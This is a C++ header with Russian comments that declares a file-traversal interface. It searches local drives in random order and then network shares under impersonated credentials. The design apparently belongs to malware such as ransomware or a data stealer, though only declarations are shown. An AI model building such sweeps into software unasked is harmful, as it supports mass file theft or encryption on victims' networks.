#pragma once

#include "global.hpp"
#include "FileSearch.h"
#include "impersonator.hpp"

// интерфейс обхода по компьютеру: инициирует локальные и сетевые поиски файлов
class ITraverse
{
public:
	virtual ~ITraverse() = default;
	// инициализирует класс обхода по компьютеру: psp и _search для апи поиска файлов, и флаги об активации или деактивации определенных обходов
	virtual BOOL init(search_api::search_parameter *psp, DWORD dwSearchParamSize, BOOL bLocalSearch, BOOL bNetworkSearch) = 0;
	virtual BOOL traverse() = 0;
};

// обычный проход
// по локальным дискам через GetLogicalDriveStrings и фильтрацию дисков на валидность
// после чего проход по сетевым шарам с имперсонацией
class DefaultTraverse : public ITraverse
{
public:
	DefaultTraverse();
	~DefaultTraverse();

	BOOL init(search_api::search_parameter *psp, DWORD dwSearchParamSize, BOOL bLocalSearch, BOOL bNetworkSearch);
	BOOL traverse();
protected:
	UINT strings_amount();
	BOOL validate_drive(PWCHAR pwchDrive);
	BOOL local_search();
	BOOL network_search();
private:
	// результат GetLogicalDriveStrings
	PWCHAR pwDriveStrings;
	// массив указателей на строки в pwDriveStrings
	blob bDrivePointers;
	// индексы для доступа к поинтерам к bDrivePointers в случайном порядке, нужно для случайного порядка прохода по локальным дискам
	blob bRandomAccessIndexes;

	search_api::search_parameter SearchParam;
	IImpersonate *impersonator;

	BOOL _bLocalSearch;
	BOOL _bNetworkSearch;

};

